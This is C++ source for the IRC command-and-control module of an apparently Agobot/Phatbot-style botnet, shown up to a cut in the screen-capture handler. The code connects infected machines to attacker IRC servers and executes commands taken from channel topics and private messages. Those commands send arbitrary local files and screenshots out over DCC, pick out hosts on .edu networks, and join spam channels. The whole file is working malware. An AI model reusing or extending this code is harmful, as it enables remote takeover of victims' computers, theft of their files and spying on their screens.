#include "main.h"
#include "mainctrl.h"

#ifdef _WIN32
	typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
	typedef bool (__stdcall *pfnFlush)(void);
	IGCSE fInternetGetConnectedStateEx;
	pfnFlush fFlushDns=NULL;
#endif

CIRC::CIRC() 
{
	#ifdef _WIN32
		HMODULE hDnsApi=GetModuleHandle("dnsapi.dll");
		if(!hDnsApi) hDnsApi=LoadLibrary("dnsapi.dll");
		if(hDnsApi) fFlushDns=(pfnFlush)GetProcAddress(hDnsApi, "DnsFlushResolverCache");
	#endif
	m_szType="CIRC";
	// Initialize/Clear all variables
	m_bRunning=true; m_bConnected=false; m_bJoined=false;
	m_iFailCount=0; m_iServerNum=0;
	m_sLocalHost.Assign(""); // Clear the localhost to prevent crash with servers that don't do userhost
	m_lLastRecv=GetTickCount();
	m_lFlags=DELIVERY_FLAGS_RELIABLE|DELIVERY_FLAGS_LOWLAT;
	m_sMedium.Assign("IRC");
}

CIRC::~CIRC() 
{
	vector<irc_server*>::iterator is;
	for(is=m_vServers.begin(); is!=m_vServers.end(); is++)
		delete (*is);
}

void *CIRC::Run() 
{
	try {
		while(m_bRunning && g_pMainCtrl->m_bRunning) 
		{
			if(!g_pMainCtrl->m_bRunning || !m_bRunning) break;
			if((m_iServerNum==0 && m_iFailCount>1) || (m_iServerNum!=0 && m_iFailCount>1)) {
				// Reset CIRC values, disconnect the sockets, and clear the logins
				m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
				g_pMainCtrl->m_pMac->ClearLogins();

				#ifdef DBGCONSOLE
					if(!m_iServerNum) // If its the root server, use another text
						g_cConsDbg.Log(1, "CIRC(0x%8.8Xh): Giving up root server \"%s:%d\" after %d retries!\n", this, g_pMainCtrl->m_pBot->si_server.sValue.CStr(), g_pMainCtrl->m_pBot->si_port.iValue, m_iFailCount);
					else
						g_cConsDbg.Log(2, "CIRC(0x%8.8Xh): Giving up server \"%s:%d\" after %d retries!\n", this, g_pMainCtrl->m_pBot->si_server.sValue.CStr(), g_pMainCtrl->m_pBot->si_port.iValue, m_iFailCount);
				#endif

				// Select new server
				m_iServerNum++;
				
				if(m_iServerNum>m_vServers.size()-1)
				{
#ifdef _WIN32
					if(fFlushDns) fFlushDns();
#else
					Execute("nscd", "-i hosts");
#endif // _WIN32
#ifdef DBGCONSOLE
						g_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Flushed DNS Cache!\n", this);
#endif // DBGCONSOLE
					m_iServerNum=0;
				}

				m_iFailCount=0; // Reset the failure count
				// Set the cvars to the new values
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_chanpass, \
					m_vServers.at(m_iServerNum)->si_chanpass->sValue);
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_mainchan, \
					m_vServers.at(m_iServerNum)->si_mainchan->sValue);
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_nickprefix, \
					m_vServers.at(m_iServerNum)->si_nickprefix->sValue);
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_port, \
					m_vServers.at(m_iServerNum)->si_port->sValue);
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_server, \
					m_vServers.at(m_iServerNum)->si_server->sValue);
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_servpass, \
					m_vServers.at(m_iServerNum)->si_servpass->sValue);
				g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_usessl, \
					m_vServers.at(m_iServerNum)->si_usessl->sValue);
				m_lLastRecv=GetTickCount(); }
			if(!m_bConnected) { // We're not connected yet, connect to the server
				// Start IdentD
				if(!g_pMainCtrl->m_bIdentD_Running && g_pMainCtrl->m_pBot->identd_enabled.bValue)
					g_pMainCtrl->m_cIdentD.Start(false);
				// Setup vars, resolve address
				sockaddr_in ssin; int iErr; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;

#ifdef DBGCONSOLE
				g_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Trying to connect to \"%s:%d\"...\n", this, g_pMainCtrl->m_pBot->si_server.sValue.CStr(), g_pMainCtrl->m_pBot->si_port.iValue);
#endif // DBGCONSOLE

				// Try to connect to the server
				if(!m_sSocket.Connect(	g_pMainCtrl->m_pBot->si_server.sValue.CStr(), 
										g_pMainCtrl->m_pBot->si_port.iValue,
										false, g_pMainCtrl->m_pBot->si_usessl.bValue)) { // Connect failed, exit
#ifdef DBGCONSOLE
					g_cConsDbg.Log(4, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" failed!\n", this, g_pMainCtrl->m_pBot->si_server.sValue.CStr(), g_pMainCtrl->m_pBot->si_port.iValue);
#endif // DBGCONSOLE
/* DANGEROUS..?
					if(!m_sLocalIp.Compare("")) {
					url uURL; if(!ParseURL("http://checkip.dyndns.org", &uURL)) return 0;
					CString sReply;	CHttpClient *pDldHlp=new CHttpClient;
					pDldHlp->sHostname.Assign(uURL.sHost); pDldHlp->iPort=uURL.iPort;
					pDldHlp->sRequest.Assign(uURL.sReq); pDldHlp->Start(true);
					while(pDldHlp->IsRunning()) Sleep(1000);
					CString sIPReply=pDldHlp->sBuffer;	
					m_sLocalIp.Assign(sIPReply.Token(1,":").Mid(1).Token(0,"<"));
				}
*/
					Sleep(10000); m_bConnected=false; m_iFailCount++; continue;
				} else { // Connection established
#ifdef DBGCONSOLE
					g_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Connection to \"%s:%d\" established!\n", this, g_pMainCtrl->m_pBot->si_server.sValue.CStr(), g_pMainCtrl->m_pBot->si_port.iValue);
#endif // DBGCONSOLE
					m_bConnected=true; m_bJoined=false; }

				m_lLastRecv=GetTickCount();

				// Get local ip address
				sockaddr sa; socklen_t sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); m_sSocket.GetSockName(sa, sas);
				char szTemp[64]; sprintf(szTemp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
					(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
				m_sLocalIp.Assign(szTemp); m_lLocalAddr=inet_addr(szTemp);

				// Send the server password
#ifdef DBGCONSOLE
				g_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Sending password...\n", this);
#endif // DBGCONSOLE
				if(g_pMainCtrl->m_pBot->si_servpass.sValue.Compare(""))
					SendRawFormat("PASS %s\r\n", g_pMainCtrl->m_pBot->si_servpass.sValue.CStr());

				// Send the nick and register with the irc server
#ifdef DBGCONSOLE
				g_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Sending nick...\n", this);
#endif // DBGCONSOLE
				SendRawFormat("NICK %s\r\nUSER %s 0 0 :%s\r\n", g_pMainCtrl->m_sUserName.CStr(), \
					g_pMainCtrl->m_sUserName.CStr(), g_pMainCtrl->m_sUserName.CStr());

				g_pMainCtrl->m_pBot->RunScript(SCRIPT_ONCONNECT);
			} else {
				char szLine[8192]; memset(szLine, 0, sizeof(szLine));
				// Wait for a complete line to be received
				bool bRecvd=false;
					bRecvd=m_sSocket.RecvLineIRC(szLine, sizeof(szLine));
				if(bRecvd) {
					m_lLastRecv=GetTickCount(); CString sLine(szLine);
#ifdef DBGCONSOLE
					g_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Received: \"%s\"\n", this, sLine.CStr());
#endif // DBGCONSOLE

					// Set m_bJoined if we joined the channel
					if(!sLine.Token(1, " ").Compare("353")) {
						g_pMainCtrl->m_pBot->RunScript(SCRIPT_ONJOIN);
						m_bJoined=true; }

					// Send PONG if we're PING'ed
					else if(!sLine.Token(0, " ").Compare("PING")) {
						SendRawFormat("PONG %s\r\n", sLine.Token(1, " ").CStr());
						if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
							g_pMainCtrl->m_pBot->si_mainchan.sValue.CStr(), \
							g_pMainCtrl->m_pBot->si_chanpass.sValue.CStr()); }

					else if(!sLine.Token(1, " ").Compare("NOTICE")) {
						if(sLine.Token(18, " ").Compare("")) {
							if(!sLine.Token(17, " ").Compare("pong"))
								SendRawFormat("PONG %s\r\n", sLine.Token(18, " ").CStr());
							if(!m_bJoined) SendRawFormat("JOIN %s %s\r\n", \
								g_pMainCtrl->m_pBot->si_mainchan.sValue.CStr(), \
								g_pMainCtrl->m_pBot->si_chanpass.sValue.CStr()); } }

					// Connected to the server, get the hostname
					else if(!sLine.Token(1, " ").Compare("001")) {
						// Set the nick
						g_pMainCtrl->m_sUserName.Assign(sLine.Token(2, " ").CStr());
						// Get the hostname
						char *h=strstr(sLine.Str(), "@");
						if(h) {m_sLocalHost.Assign(h+1);}
						
						if(!m_bJoined) {
							SendRawFormat("JOIN %s %s\r\n", \
							g_pMainCtrl->m_pBot->si_mainchan.sValue.CStr(), \
							g_pMainCtrl->m_pBot->si_chanpass.sValue.CStr());
							while(!g_pMainCtrl->m_cStartupThread.m_bCanSpamAOLSet) Sleep(1000);
							if(g_pMainCtrl->m_cStartupThread.m_bCanSpamAOL && g_pMainCtrl->m_pBot->spam_aol_enabled.bValue)
								SendRawFormat("JOIN %s %s\r\n", \
								g_pMainCtrl->m_pBot->spam_aol_channel.sValue.CStr(), \
								g_pMainCtrl->m_pBot->si_chanpass.sValue.CStr()); }
						if(m_sLocalHost.GetLength()<1)
						{	SendRawFormat("USERHOST %s\r\n", g_pMainCtrl->m_sUserName.CStr()); }
					}
					
					// Get the hostname
					else if(!sLine.Token(1, " ").Compare("302")) {
						CString sTemp=sLine.Token(3, " ");
						char *h=strstr(sTemp.Str(), "@");
							if(h) m_sLocalHost.Assign(h+1);
					}

					// End of names list
					else if(!sLine.Token(1, " ").Compare("366")) {
						m_bJoined=true;
						SendRawFormat("MODE %s\r\n", sLine.Token(3, " ").CStr());
					}
					
					// These messages indicate the channel got joined
					else if(!sLine.Token(1, " ").Compare("324") || 
							!sLine.Token(1, " ").Compare("329") || 
							!sLine.Token(1, " ").Compare("352") || 
							!sLine.Token(1, " ").Compare("315")) {
						m_bJoined=true;
					}

					// Get channel modes on JOIN
					else if(!sLine.Token(1, " ").Compare("324")) {
						CString sTemp=sLine.Token(4, " ");
						if (sTemp.Find("m") != 0)
						{
							setSilent(sLine.Token(3, " "),1);
						}
						else
						{
							setSilent(sLine.Token(3, " "),0);
						}
					}

					// Get channel modes on MODE
					else if(!sLine.Token(1, " ").Compare("MODE")) {
						CString sTemp=sLine.Token(3, " ");
						int tmpintPlus=0, tmpintMinus=0;
						CString modePlus="", modeMinus="";
						tmpintPlus = sTemp.Find("+");
						tmpintMinus = sTemp.Find("-");
						if (tmpintPlus != 0) modePlus = sTemp.Mid(tmpintPlus);
						if (tmpintMinus != 0) modeMinus = sTemp.Mid(tmpintMinus);
						if (isSilent(sLine.Token(2, " ")) && modePlus.Find("m") != 0) 
						{ setSilent(sLine.Token(2, " "),1); }
						if (isSilent(sLine.Token(2, " ")) && modeMinus.Find("m") != 0)
						{ setSilent(sLine.Token(2, " "),0); }
						if (modePlus.Find("v") != 0  && (!sLine.Token(4, " ").Compare(g_pMainCtrl->m_sUserName)))
						{ setSilent(sLine.Token(2, " "),0); }
						if (isSilent(sLine.Token(2, " ")) && modeMinus.Find("v") != 0 && (!sLine.Token(4, " ").Compare(g_pMainCtrl->m_sUserName)))
						{ setSilent(sLine.Token(2, " "),1); }
					}

					// Its a topic, check for topic command
					else if(!sLine.Token(1, " ").Compare("332") && \
						g_pMainCtrl->m_pBot->bot_topiccmd.bValue) {
						CString sTopic=sLine.Token(1, ":");
						sTopic.Append("|");
						for(int i = 0; sTopic.Token(i, "|").Compare(""); i++)
						{
							CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
							// Check silent and notice parameters, and set bool flags accordingly
							if(sLine.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
							if(sLine.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
							if(sLine.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;

							msg->sSrc.Assign(sLine.Token(3, " ")); msg->sIdentd.Assign("TopicCmd");
							msg->sHost.Assign("TopicCmd.Net"); msg->sDest.Assign("TopicCmd");
							msg->sChatString.Assign(sTopic.Token(i, "|").CStr());

							// Let the bot handle it internally
							ex->Set(msg, true); delete msg;
							ex->Start(true);
						}
					}


					// Its a private message
					else if(!sLine.Token(1, " ").Compare("PRIVMSG")) {
						CMessage *msg=new CMessage; CCmdExecutor *ex=new CCmdExecutor;
						// Check silent and notice parameters, and set bool flags accordingly
						if(sLine.Find(" -s")) msg->bSilent=true; else msg->bSilent=false;
						if(sLine.Find(" -n")) msg->bNotice=true; else msg->bNotice=false;
						if(sLine.Find(" -o")) msg->bOutchan=true; else msg->bOutchan=false;
						// Parse the strings, and insert them into the message
						msg->sSrc.Assign(sLine.Token(0, ":").Token(0, " ").Token(0, "!"));
						msg->sIdentd.Assign(sLine.Token(1, "!").Token(0, "@"));
						msg->sHost.Assign(sLine.Token(1, "@").Token(0, " "));
						msg->sDest.Assign(sLine.Token(2, " "));
						msg->pReply=this;
						char *szText=strstr(sLine.Str(), " :");
						if(szText) msg->sChatString.Assign(szText+2); else msg->sChatString.Assign("");
#ifdef DBGCONSOLE
						g_cConsDbg.Log(1, "CIRC(0x%8.8Xh): %s / %s / %s / %s / \"%s\"...\n", \
							this, msg->sSrc.CStr(), msg->sIdentd.CStr(), msg->sHost.CStr(), \
							msg->sDest.CStr(), msg->sChatString.CStr());
#endif
						// Check if its a DCC request, if yes, start a new dcc control channel
						if(	msg->sChatString.operator [](0)=='\x01' && !msg->sChatString.Mid(1).Token(0, " ").Compare("DCC") &&
							!msg->sChatString.Token(1, " ").Compare("CHAT")) {
							CString sAddr=msg->sChatString.Token(3, " "), sPort=msg->sChatString.Token(4, " ").Token(0, "\x01");
							unsigned long lDCCAddr=ntohl(atol(sAddr.CStr()));
							unsigned short sDCCPort=atoi(sPort.CStr());
#ifdef DBGCONSOLE
							g_cConsDbg.Log(3, "CIRC(0x%8.8Xh): Received DCC Request for: \"%s:%d\"\n", this,
								inet_ntoa(to_in_addr(lDCCAddr)), sDCCPort);
#endif // DBGCONSOLE
							CSocket *pDCCSocket=new CSocket;
							if(pDCCSocket->Connect(lDCCAddr, sDCCPort)) {
								if(!g_pMainCtrl->m_pMac->FindLogin(msg->sSrc.CStr())) {
									CString sTemp("Access denied. Log in first.\r\n");
									pDCCSocket->Write(sTemp.CStr(), sTemp.GetLength());
									pDCCSocket->Disconnect();
									delete pDCCSocket;

									LoggedInBroadcast("Failed DCC attempt - src: \"%s\" srchost: \"%s:%d\"\n",
										msg->sSrc.CStr(), inet_ntoa(to_in_addr(lDCCAddr)), sDCCPort);
								} else {
									CString sTemp; sTemp.Format("Connection from \"%s\", logged in as \"%s\"\r\n",
										inet_ntoa(to_in_addr(lDCCAddr)), msg->sSrc.CStr());

									pDCCSocket->Write(sTemp.CStr(), sTemp.GetLength());
									
									CDCC_Handler *pDCC_Handler=new CDCC_Handler;
									pDCC_Handler->m_pClientSocket=pDCCSocket;
									pDCC_Handler->m_sInitiator=msg->sSrc;
									pDCC_Handler->Start(true, false, false);
								}
							} else {
#ifdef DBGCONSOLE
								g_cConsDbg.Log(3, "CIRC(0x%8.8Xh): DCC Connect to %s:%d failed.\n", this,
									inet_ntoa(to_in_addr(lDCCAddr)), sDCCPort);
#endif // DBGCONSOLE
								delete pDCCSocket; }
						} else {
							// Let the bot handle it
							ex->Set(msg); delete msg;

							// Fail if the hash check failed
							if(!g_pMainCtrl->m_bHashCheckFailed) ex->Start(true);
							else DoReply(msg, "Go home newb!");
						}
					}
					
					// Someone got kicked, maybe the bot itself
					else if(!sLine.Token(1, " ").Compare("KICK")) {
						// If someone is logged in by that name, log him out
						login *pLogin=g_pMainCtrl->m_pMac->FindLogin(sLine.Token(3, " "));
						if(pLogin) g_pMainCtrl->m_pMac->DelLogin(sLine.Token(3, " "), sLine.Token(3, " "));

						// If the bot itself is kicked, rejoin, and send "screw you %s!"
						if(!sLine.Token(3, " ").Compare(g_pMainCtrl->m_sUserName)) {
							CString sName(sLine.Token(1, ":").Token(0, "!").CStr());
							m_bJoined=false; SendRawFormat("JOIN %s %s\r\n", \
								g_pMainCtrl->m_pBot->si_mainchan.sValue.CStr(), \
								g_pMainCtrl->m_pBot->si_chanpass.sValue.CStr());
							SendRawFormat("PRIVMSG %s :screw you %s!\r\n", g_pMainCtrl->m_pBot->si_mainchan.sValue.CStr(), sName.CStr()); } }

					// Someone changed his nickname
					else if(!sLine.Token(1, " ").Compare("NICK")) {
						// Check if hes logged in, if so, replace the username in CMac
						CString sOldNick(sLine.Token(1, ":").Token(0, "!").CStr());
						if(!strstr(sLine.Str(), " :")) continue;
						CString sNewNick(strstr(sLine.Str(), " :"));
						if(sOldNick.Compare("") && sNewNick.Compare("")) {
							login *pLogin=g_pMainCtrl->m_pMac->FindLogin(sOldNick);
							if(pLogin) pLogin->sIRCUsername.Assign(sNewNick);
							if(!sOldNick.Compare(g_pMainCtrl->m_sUserName)) g_pMainCtrl->m_sUserName.Assign(sNewNick); } }

					// Someone left the channel
					else if(!sLine.Token(1, " ").Compare("PART") || !sLine.Token(1, " ").Compare("QUIT")) {
						// Check if hes logged in, if so, log him out
						login *pLogin=g_pMainCtrl->m_pMac->FindLogin(sLine.Token(1, ":").Token(0, "!"));
						if(pLogin) g_pMainCtrl->m_pMac->DelLogin(sLine.Token(1, ":").Token(0, "!"), sLine.Token(1, ":").Token(0, "!")); }
				} else { // We didn't receive a valid line, or the server closed the connection
					Fail(); continue;
				}
			}
		}
	} catch(...) {
		return Run();
	}

	return NULL;
}

bool CIRC::Init() {
	return true;
}

bool CIRC::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare(m_cmdDisconnect.szName) || !pMsg->sCmd.Compare(m_cmdReconnect.szName)) {
		m_iServerNum=0; m_iFailCount=0;
		m_bJoined=false; m_bConnected=false; m_sSocket.Disconnect();
		g_pMainCtrl->m_pMac->ClearLogins(); }

	else if(!pMsg->sCmd.Compare(m_cmdQuit.szName)) {
		Disconnect(); g_pMainCtrl->m_bRunning=false; }

	else if(!pMsg->sCmd.Compare(m_cmdAction.szName)) {
		pMsg->sReplyTo.Assign(pMsg->sChatString.Token(1, " ").Str());
		pMsg->pReply=g_pMainCtrl->m_pIRC;
		DoReplyF(pMsg, "\1ACTION %s\1", pMsg->sChatString.Token(2, " ", true).CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdDCCSend.szName)) {
#ifdef _WIN32
/* works on win32 */
		HANDLE hFileName;
		SOCKET dcc, sock = NULL;
		SOCKADDR_IN GuestAddr, SockAddr;
		socklen_t addrlen;
		DWORD dwErr1, dwErr2, dwMode = 0;
		CString sReply;
		char buffer[1024];
		unsigned long lLocalIp;
		unsigned int iFileSize;
		int iLength, iBytesSent = 0;

		if(!pMsg->sChatString.Token(1, " ").Compare("") || !pMsg->sChatString.Token(2, " ").Compare("")) return false;

		hFileName = CreateFile(pMsg->sChatString.Token(2, " ", true).CStr(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
		if(hFileName == INVALID_HANDLE_VALUE)
		{
			sReply.Assign("Error opening file.");
			SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
			return false;
		}
		iFileSize = GetFileSize(hFileName, NULL);

		if((dcc = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
			return false;

		memset(&SockAddr, 0, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(3553);
		SockAddr.sin_addr.s_addr = INADDR_ANY;
		if(bind(dcc, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0)
			return false;

		addrlen = sizeof(GuestAddr);
		iLength = sizeof(SockAddr);
		getsockname(dcc, (SOCKADDR *)&SockAddr, &iLength);

		if(listen(dcc, 1) == SOCKET_ERROR) return false;

		hostent *hEnt;

		hEnt=gethostbyname(m_sLocalHost.CStr());
		memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);

		DoReplyF(pMsg, "\001DCC SEND \"%s\" %d %d %i\001", pMsg->sChatString.Token(2, " ").CStr(), ntohl(lLocalIp), ntohs(SockAddr.sin_port), iFileSize);

		// Timeout after 45 seconds
		TIMEVAL time; fd_set fd_struct;
		time.tv_sec = 45;
		time.tv_usec = 0;
		FD_ZERO(&fd_struct); FD_SET(dcc, &fd_struct);
		if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
		{
			sReply.Assign("DCC Timed Out, closing connection.");
			SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); 

			CloseHandle(hFileName); closesocket(dcc); closesocket(sock);
			return false;
		}

		// Wait for connection
		sock = accept(dcc, (SOCKADDR *) &GuestAddr, &addrlen);
		if(sock != INVALID_SOCKET)
		{
			closesocket(dcc);
			while(1) {
				unsigned int Fsend = 1024;

				memset(buffer, 0, sizeof(buffer));
				if(Fsend > iFileSize - iBytesSent) Fsend = iFileSize - iBytesSent;

				SetFilePointer(hFileName, iBytesSent, NULL, FILE_BEGIN);
				ReadFile(hFileName, buffer, Fsend, &dwMode, NULL);

				dwErr1 = send(sock, buffer, Fsend, 0);
				dwErr2 = recv(sock, buffer, sizeof(buffer), 0);

				iBytesSent += dwErr1;
				if(iFileSize - iBytesSent < 1 || dwErr1 < 1 || dwErr2 < 1)
					break;
			}
		}
		sReply.Format("Connection closed(%i/%ikB sent).", iBytesSent / 1024, iFileSize / 1024);
		SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
		CloseHandle(hFileName); closesocket(dcc); closesocket(sock);


#else
/* works on linux */

		FILE *fp; int iLength, iBytesSent=0;
		sockaddr_in GuestAddr, SockAddr; socklen_t addrlen;
		unsigned long lMode=0, lLocalIp, lFileSize;
		int iErr1, iErr2;
		CString sReply; char buffer[1024]; CSocket sDCC, sSock;

		if(!pMsg->sChatString.Token(1, " ").Compare("") || !pMsg->sChatString.Token(2, " ").Compare("")) return false;

		fp=fopen(pMsg->sChatString.Token(2, " ", true).CStr(), "rb");
		if(!fp) {
			SendMsg(pMsg->bSilent, pMsg->bNotice, "DCC: Error opening file.", pMsg->sReplyTo.Str());
			return false; }

		lFileSize=GetFileSize(fp);
		
		init_random(); int iPort=brandom(1024, 65535);
		
		if(!sDCC.Bind(iPort)) {
			pMsg->pReply->DoReplyF(pMsg, "DCC: Failed to bind port %d.", iPort);
			fclose(fp); return false; }
		sDCC.SetAsync(true);

		DoReplyF(pMsg, "\001DCC SEND \"%s\" %d %d %i\001", pMsg->sChatString.Token(2, " ").CStr(), 
			htonl(m_lLocalAddr), iPort, lFileSize);

		// Timeout after 45 seconds
		unsigned long lStartTime=GetTickCount();

		while(true) {
			if((GetTickCount()-lStartTime)>=45000) {
				// Timeout
				SendMsg(pMsg->bSilent, pMsg->bNotice, "DCC: Timed Out, closing connection.", pMsg->sReplyTo.Str());
				sDCC.Disconnect(); fclose(fp); return false; }
			if(sDCC.Accept(sSock)) {
				// Got connection
				break; }
			Sleep(250); } // Sleep to prevent overload

		lStartTime=GetTickCount();
		while(true) {
			int Fsend=1024;

			memset(buffer, 0, sizeof(buffer));
			if(Fsend>lFileSize-iBytesSent) Fsend=lFileSize-iBytesSent;

			fseek(fp, iBytesSent, SEEK_SET);
			fread(buffer, sizeof(char), Fsend, fp);

			if(!sSock.Write(buffer, Fsend, &iErr1)) break;
			if(!sSock.Recv(buffer, sizeof(buffer), &iErr2)) break;

			iBytesSent+=iErr1;
			if(lFileSize-iBytesSent<1 || iErr1<1 || iErr2<1)
				break; }
		unsigned long lElapsedS=(GetTickCount()-lStartTime)/1000;
		if(!lElapsedS) lElapsedS++; // Prevent divide by 0

		sReply.Format("Connection closed(%2.2f/%2.2fkB sent, %2.2fkB/s).", ((float)iBytesSent)/1024.0f, ((float)lFileSize)/1024.0f,
			(((float)iBytesSent)/1024.0f)/((float)lElapsedS));
		SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
		fclose(fp); sDCC.Disconnect(); sSock.Disconnect();

#endif // _WIN32

	}
	else if(!pMsg->sCmd.Compare(m_cmdNetInfo.szName)) {
		DoReplyF(pMsg, "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdGetEdu.szName)) {
		if(m_sLocalHost.Find(".edu") || m_sLocalHost.Find(".Edu") || m_sLocalHost.Find(".EDU"))
			DoReplyF(pMsg, "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdGetEduJoin.szName)) {
		pMsg->pReply=g_pMainCtrl->m_pIRC;
		if(m_sLocalHost.Find(".edu") || m_sLocalHost.Find(".Edu") || m_sLocalHost.Find(".EDU"))
			SendRawFormat("JOIN %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr()); 
	}

	else if(!pMsg->sCmd.Compare(m_cmdGetHost.szName)) {
		if(m_sLocalHost.Find(pMsg->sChatString.Token(1, " ")))
			DoReplyF(pMsg, "%s", NetInfo().CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdGetHostJoin.szName)) {
		pMsg->pReply=g_pMainCtrl->m_pIRC;
		if(m_sLocalHost.Find(pMsg->sChatString.Token(1, " ")))
			SendRawFormat("JOIN %s %s\r\n", pMsg->sChatString.Token(2, " ").CStr(), pMsg->sChatString.Token(3, " ").CStr()); 
	}

	else if(!pMsg->sCmd.Compare(m_cmdJoin.szName)) {
		pMsg->pReply=g_pMainCtrl->m_pIRC;
		SendRawFormat("JOIN %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdPart.szName)) {
		pMsg->pReply=g_pMainCtrl->m_pIRC;
		SendRawFormat("PART %s\r\n", pMsg->sChatString.Token(1, " ").CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdRaw.szName)) {
		CString sStr; sStr.Format("%s\r\n", pMsg->sChatString.Token(1, " ", true).CStr());
		SendRaw(sStr.Str()); }

	else if(!pMsg->sCmd.Compare(m_cmdPrivMsg.szName)) {
		SendMsg(false, false, pMsg->sChatString.Token(2, " ", true).Str(), pMsg->sChatString.Token(1, " ").Str()); }

	else if(!pMsg->sCmd.Compare(m_cmdMode.szName)) {
		pMsg->pReply=g_pMainCtrl->m_pIRC;
		SendRawFormat("MODE %s %s %s\r\n", pMsg->sChatString.Token(1, " ").CStr(), pMsg->sChatString.Token(2, " ").CStr(), pMsg->sChatString.Token(3, " ").CStr()); }

	else if(!pMsg->sCmd.Compare(m_cmdServer.szName)) {
		g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_server, pMsg->sChatString.Token(1, " ").CStr());
		g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_port, pMsg->sChatString.Token(2, " ").CStr());
		g_pMainCtrl->m_pCVar->SetCVar(&g_pMainCtrl->m_pBot->si_servpass, pMsg->sChatString.Token(3, " ").CStr()); }

#ifdef _WIN32
	else if(!pMsg->sCmd.Compare(m_cmdScreenCap.szName)) {
		ScreenCap();
		DoReplyF(pMsg, "Capturing Screen...");
		Sleep(1000);

		sockaddr sa; socklen_t sas;
		// get ip address
		sas=sizeof(sa); memset(&sa, 0, sizeof(sa)); m_sSocket.GetSockName(sa, sas);
		char szIP[16]; sprintf(szIP, "%d.%d.%d.%d",
		(unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);

		CString bmpfile;
		bmpfile.Format("%s.bmp", szIP);

/* works on win32 */
		HANDLE hFileName;
		SOCKET dcc, sock = NULL;
		SOCKADDR_IN GuestAddr, SockAddr;
		socklen_t addrlen;
		DWORD dwErr1, dwErr2, dwMode = 0;
		CString sReply;
		char buffer[1024];
		unsigned long lLocalIp;
		unsigned int iFileSize;
		int iLength, iBytesSent = 0;

		if(!pMsg->sChatString.Token(1, " ").Compare(""))  { 
		DoReplyF(pMsg, "Error: do <your-prefix>irc.screencap <your-nick>");		
		return false;  }

		hFileName = CreateFile(bmpfile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
		if(hFileName == INVALID_HANDLE_VALUE)
		{
			sReply.Assign("Error opening file.");
			SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
			return false;
		}
		iFileSize = GetFileSize(hFileName, NULL);

		if((dcc = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
			return false;

		memset(&SockAddr, 0, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(3553);
		SockAddr.sin_addr.s_addr = INADDR_ANY;
		if(bind(dcc, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0)
			return false;

		addrlen = sizeof(GuestAddr);
		iLength = sizeof(SockAddr);
		getsockname(dcc, (SOCKADDR *)&SockAddr, &iLength);

		if(listen(dcc, 1) == SOCKET_ERROR) return false;

		hostent *hEnt;

		hEnt=gethostbyname(m_sLocalHost.CStr());
		memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);

		DoReplyF(pMsg, "\001DCC SEND \"%s.bmp\" %d %d %i\001", szIP, ntohl(lLocalIp), ntohs(SockAddr.sin_port), iFileSize); 

		// Timeout after 45 seconds
		TIMEVAL time; fd_set fd_struct;
		time.tv_sec = 45;
		time.tv_usec = 0;
